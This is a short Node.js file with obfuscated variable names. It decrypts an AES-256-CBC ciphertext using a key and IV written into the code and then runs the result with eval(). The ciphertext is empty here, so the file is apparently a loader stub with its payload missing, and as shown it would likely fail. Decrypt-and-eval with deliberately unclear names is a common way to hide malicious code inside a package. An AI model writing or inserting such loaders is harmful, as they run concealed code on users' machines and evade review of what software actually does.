const ito = require('crypto');
const itinho = Buffer.from('3674d2c08f7b9666f3674f7ad50a1703fef5eb9a7f3ae272a8fbb46ec7df6927', 'hex');
const octua = Buffer.from('3a799cc311ab84a8592eb0d0e0c858d0', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
